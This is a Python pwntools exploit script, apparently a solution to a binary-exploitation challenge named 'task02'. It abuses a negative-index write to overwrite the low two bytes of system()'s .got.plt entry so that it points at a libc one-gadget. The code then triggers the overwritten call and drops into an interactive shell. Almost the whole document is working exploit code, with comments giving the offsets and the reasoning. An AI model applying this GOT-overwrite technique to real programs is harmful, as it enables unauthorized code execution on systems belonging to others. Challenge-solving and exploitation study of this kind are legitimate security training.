from pwn import *


# The negative-index vulnerability allows for byte-by-byte writing. Since we need to write a few bytes,
# it means we need to use the vulnerability a few times on a function that will only get called after we are done.
# We also need a function where RAX == 0 before the call (as shown in the gadget requirements).
# The call to the system() function inside show_ascii_art() fits this purpose exactly, since it sets RAX to 0 before the call
# and since it doesn't get called in the main loop.
# So we want to overwrite the .got.plt entry of system() with the address of the gadget.
# - system() offset in libc   = 0x45390
# - rop gadget offset in libc = 0x45216
# Only the last two bytes differ in the offset.
# This means that we need to just replace the last 2 significant bytes of the .got.plit entry.
# On my machine, libc seems to always have a base image address with 5 zeros at the end (e.g. something like 0x00007f92c1e00000).
# This means that the exploit has a 100% chance of working by using these constant bytes: 0x16(22) and 0x52(82).


io = process("./task02")

io.recvuntil(b'Do you like the current ASCII art? Y/N')
io.sendline(b'N')

io.recvuntil(b'What do you want to modify? idx new_val')
idx1 = -72 # The index necessary to get to the least significant byte in the .got.plt entry of system()
byte1 = 22
io.sendline(f'{idx1} {byte1}'.encode())

io.recvuntil(b'Finished?')
io.sendline(b'N')
io.recvuntil(b'What do you want to modify? idx new_val')
idx2 = -71 # The index necessary to get to the second least significant byte in the .got.plt entry of system()
byte2 = 82
io.sendline(f'{idx2} {byte2}'.encode())

io.recvuntil(b'Finished?')
io.sendline(b'Y')

io.interactive()
